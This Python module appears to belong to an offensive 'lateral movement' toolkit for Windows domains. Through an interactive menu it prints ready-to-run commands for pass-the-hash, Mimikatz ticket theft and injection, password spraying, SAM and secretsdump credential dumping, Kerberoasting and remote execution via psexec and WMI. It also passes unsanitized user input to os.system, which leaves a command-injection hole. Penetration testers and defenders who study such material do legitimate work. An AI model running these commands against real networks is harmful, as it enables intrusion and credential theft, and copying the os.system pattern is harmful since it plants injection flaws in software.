#!/usr/bin/env python3
# app/post_exploitation/lateral_movement.py

import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE
from utils import Logger, pause, InputValidator, clear_screen


class Terminal:
    MARGIN = 4
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()


class LateralMovement:
    def show_header(self):
        clear_screen()
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}╔════════════════════════════════════════╗{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}║         LATERAL MOVEMENT TOOLKIT       ║{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}╚════════════════════════════════════════╝{C_RESET}")
        Terminal.print_margin()
    
    def run(self):
        while True:
            self.show_header()
            
            Terminal.print_margin(f"{C_TITLE}┌─ LATERAL MOVEMENT ──────────────────┐{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  ENUMERATION:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [1]  Network Discovery{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [2]  Active Directory Recon{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [3]  SMB Share Enumeration{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  MOVEMENT TECHNIQUES:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [4]  Pass-the-Hash (PTH){C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [5]  Pass-the-Ticket (PTT){C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [6]  Remote Desktop (RDP){C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [7]  PSExec{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [8]  WMI Execution{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  TOOLS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [9]  CrackMapExec{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [10] Impacket Scripts{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└─────────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.network_discovery()
            elif choice == '2':
                self.ad_recon()
            elif choice == '3':
                self.smb_enumeration()
            elif choice == '4':
                self.pass_the_hash()
            elif choice == '5':
                self.pass_the_ticket()
            elif choice == '6':
                self.rdp_access()
            elif choice == '7':
                self.psexec()
            elif choice == '8':
                self.wmi_execution()
            elif choice == '9':
                self.crackmapexec()
            elif choice == '10':
                self.impacket_tools()
            else:
                Logger.error("Invalid choice!")
                pause()
    
    def network_discovery(self):
        """Network discovery"""
        self.show_header()
        Logger.info("Network Discovery")
        Terminal.print_margin()
        
        Logger.info("Commands:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Ping sweep{C_RESET}")
        Terminal.print_margin("for i in {1..254}; do ping -c 1 192.168.1.$i | grep 'bytes from'; done")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# ARP scan{C_RESET}")
        Terminal.print_margin("arp-scan -l")
        Terminal.print_margin("netdiscover -r 192.168.1.0/24")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Nmap discovery{C_RESET}")
        Terminal.print_margin("nmap -sn 192.168.1.0/24")
        
        pause()
    
    def ad_recon(self):
        """Active Directory reconnaissance"""
        self.show_header()
        Logger.info("Active Directory Reconnaissance")
        Terminal.print_margin()
        
        Logger.info("BloodHound - AD mapping tool:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Collect data{C_RESET}")
        Terminal.print_margin("bloodhound-python -d domain.local -u user -p password -c all")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# PowerView (PowerShell){C_RESET}")
        Terminal.print_margin("Get-NetDomain")
        Terminal.print_margin("Get-NetDomainController")
        Terminal.print_margin("Get-NetUser")
        Terminal.print_margin("Get-NetGroup")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# ldapsearch{C_RESET}")
        Terminal.print_margin("ldapsearch -x -h DC_IP -b 'DC=domain,DC=local'")
        
        pause()
    
    def smb_enumeration(self):
        """SMB share enumeration"""
        self.show_header()
        Logger.info("SMB Share Enumeration")
        Terminal.print_margin()
        
        target = input(f"{C_INFO}Target IP: {C_RESET}").strip()
        if not target:
            pause()
            return
        
        Logger.info(f"Enumerating {target}...")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# List shares{C_RESET}")
        Terminal.print_margin(f"smbclient -L //{target}/ -N")
        os.system(f"smbclient -L //{target}/ -N")
        Terminal.print_margin()
        
        Terminal.print_margin(f"{C_OK}# Enum4linux{C_RESET}")
        Terminal.print_margin(f"enum4linux -a {target}")
        
        pause()
    
    def pass_the_hash(self):
        """Pass-the-Hash attack"""
        self.show_header()
        Logger.info("Pass-the-Hash (PTH) Attack")
        Terminal.print_margin()
        
        Logger.info("PTH allows authentication using NTLM hash instead of password")
        Terminal.print_margin()
        
        Logger.info("Tools and techniques:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Impacket psexec{C_RESET}")
        Terminal.print_margin("impacket-psexec -hashes :NTLM_HASH DOMAIN/USER@TARGET")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# CrackMapExec{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGET -u USER -H NTLM_HASH")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Evil-WinRM{C_RESET}")
        Terminal.print_margin("evil-winrm -i TARGET -u USER -H NTLM_HASH")
        
        pause()
    
    def pass_the_ticket(self):
        """Pass-the-Ticket attack"""
        self.show_header()
        Logger.info("Pass-the-Ticket (PTT) Attack")
        Terminal.print_margin()
        
        Logger.info("Kerberos ticket manipulation")
        Terminal.print_margin()
        
        Logger.info("Mimikatz commands:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Export tickets{C_RESET}")
        Terminal.print_margin("sekurlsa::tickets /export")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Inject ticket{C_RESET}")
        Terminal.print_margin("kerberos::ptt ticket.kirbi")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Impacket{C_RESET}")
        Terminal.print_margin("export KRB5CCNAME=ticket.ccache")
        Terminal.print_margin("impacket-psexec domain/user@target -k -no-pass")
        
        pause()
    
    def rdp_access(self):
        """Remote Desktop access"""
        self.show_header()
        Logger.info("Remote Desktop (RDP) Access")
        Terminal.print_margin()
        
        target = input(f"{C_INFO}Target IP: {C_RESET}").strip()
        username = input(f"{C_INFO}Username: {C_RESET}").strip()
        
        if not target or not username:
            pause()
            return
        
        Logger.info("RDP Connection methods:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# rdesktop{C_RESET}")
        Terminal.print_margin(f"rdesktop {target} -u {username}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# xfreerdp{C_RESET}")
        Terminal.print_margin(f"xfreerdp /u:{username} /v:{target}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# With pass-the-hash{C_RESET}")
        Terminal.print_margin(f"xfreerdp /u:{username} /pth:NTLM_HASH /v:{target}")
        
        pause()
    
    def psexec(self):
        """PSExec execution"""
        self.show_header()
        Logger.info("PSExec Remote Execution")
        Terminal.print_margin()
        
        Logger.info("Impacket PSExec:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# With password{C_RESET}")
        Terminal.print_margin("impacket-psexec DOMAIN/USER:PASSWORD@TARGET")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# With hash{C_RESET}")
        Terminal.print_margin("impacket-psexec -hashes :NTLM_HASH DOMAIN/USER@TARGET")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Execute command{C_RESET}")
        Terminal.print_margin('impacket-psexec DOMAIN/USER@TARGET "cmd.exe /c whoami"')
        
        pause()
    
    def wmi_execution(self):
        """WMI remote execution"""
        self.show_header()
        Logger.info("WMI Remote Execution")
        Terminal.print_margin()
        
        Logger.info("Impacket WMIExec:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Execute command{C_RESET}")
        Terminal.print_margin("impacket-wmiexec DOMAIN/USER:PASSWORD@TARGET")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# CrackMapExec{C_RESET}")
        Terminal.print_margin("crackmapexec wmi TARGET -u USER -p PASSWORD -x 'whoami'")
        
        pause()
    
    def crackmapexec(self):
        """CrackMapExec usage"""
        self.show_header()
        Logger.info("CrackMapExec - Swiss Army Knife")
        Terminal.print_margin()
        
        Logger.info("Common commands:")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# SMB enumeration{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGETS -u USER -p PASSWORD")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Password spraying{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGETS -u users.txt -p PASSWORD")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Share enumeration{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGET -u USER -p PASSWORD --shares")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Execute command{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGET -u USER -p PASSWORD -x 'whoami'")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Dump SAM{C_RESET}")
        Terminal.print_margin("crackmapexec smb TARGET -u USER -p PASSWORD --sam")
        
        pause()
    
    def impacket_tools(self):
        """Impacket scripts"""
        self.show_header()
        Logger.info("Impacket Scripts Collection")
        Terminal.print_margin()
        
        scripts = [
            ("psexec.py", "Remote command execution"),
            ("smbexec.py", "SMB-based command execution"),
            ("wmiexec.py", "WMI-based command execution"),
            ("secretsdump.py", "Dump credentials (SAM, LSA, NTDS)"),
            ("GetNPUsers.py", "Get users without Kerberos pre-auth"),
            ("GetUserSPNs.py", "Kerberoasting attack"),
            ("getTGT.py", "Request TGT ticket"),
            ("goldenPac.py", "MS14-068 exploit"),
        ]
        
        for script, desc in scripts:
            Terminal.print_margin(f"{C_OK}[+] {script:20s}{C_RESET} - {desc}")
        
        Terminal.print_margin()
        Logger.info("Example usage:")
        Terminal.print_margin("impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET")
        
        pause()


if __name__ == "__main__":
    lat_move = LateralMovement()
    lat_move.run()